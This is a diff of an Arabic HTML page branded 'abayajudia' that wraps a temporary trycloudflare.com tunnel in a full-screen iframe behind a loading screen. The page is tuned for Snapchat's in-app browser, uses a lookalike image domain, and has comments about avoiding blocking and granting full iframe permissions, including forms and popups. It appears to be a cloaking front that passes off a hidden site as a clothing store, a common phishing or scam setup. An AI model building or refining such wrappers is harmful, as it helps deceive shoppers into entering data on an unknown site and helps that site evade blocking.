@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <!-- منع تكبير/تصغير الشاشة العشوائي وثبات الأبعاد -->
+    <!-- تثبيت المقاسات ومنع أي تلاعب بالتكبير أو التصغير من التطبيق -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>abayajudia</title>
     <meta property="og:title" content="abayajudia">
@@ -10,21 +10,22 @@
     <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
     <meta property="og:url" content="https://abayajudia.new-collection/">
     <meta property="og:type" content="website">
+    
     <style>
-        /* تثبيت الـ Viewport الحقيقي مع منع أي Scroll خارجي نهائياً */
+        /* إغلاق مساحات الصفحة بالكامل ومنع الـ Scroll الخارجي نهائياً */
         body, html { 
             margin: 0; 
             padding: 0; 
             width: 100%;
             height: 100%;
-            position: fixed; /* لحل مشاكل التثبيت في سناب شات */
+            position: fixed;
             overflow: hidden; 
-            background-color: #f9f9f9; 
+            background-color: #ffffff; 
             font-family: Tahoma, sans-serif;
             -webkit-overflow-scrolling: touch;
         }
         
-        /* شاشة التحميل */
+        /* شاشة التحميل الاحترافية */
         #loader {
             position: fixed;
             top: 0;
@@ -37,7 +38,7 @@
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            transition: opacity 0.4s ease;
+            transition: opacity 0.3s ease;
         }
 
         .spinner {
@@ -62,7 +63,7 @@
             letter-spacing: 1px;
         }
 
-        /* تنسيق الـ Iframe لملء شاشة سناب شات بدقة وتفعيل الـ Hardware Acceleration */
+        /* تنسيق الـ Iframe مع تفعيل التسريع العتادي ومنع قيود العرض */
         iframe { 
             width: 100%; 
             height: 100%; 
@@ -71,7 +72,7 @@
             position: absolute;
             top: 0;
             left: 0;
-            transform: translateZ(0); /* تسريع الأداء عبر كارت الشاشة */
+            transform: translateZ(0);
         }
     </style>
 </head>
@@ -83,8 +84,13 @@
         <div class="brand-loading">abayajudia</div>
     </div>
 
-    <!-- الـ Iframe -->
-    <iframe src="https://dodge-bidder-watching-television.trycloudflare.com" onload="hideLoader()"></iframe>
+    <!-- الـ Iframe مع صياغة آمنة تمنع الحظر وتسمح بالصلاحيات الكاملة -->
+    <iframe 
+        src="https://dodge-bidder-watching-television.trycloudflare.com" 
+        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-pointer-lock"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+        onload="hideLoader()">
+    </iframe>
 
     <script>
         function hideLoader() {
@@ -92,7 +98,7 @@
             loader.style.opacity = '0';
             setTimeout(() => {
                 loader.style.display = 'none';
-            }, 400);
+            }, 300);
         }
     </script>
 
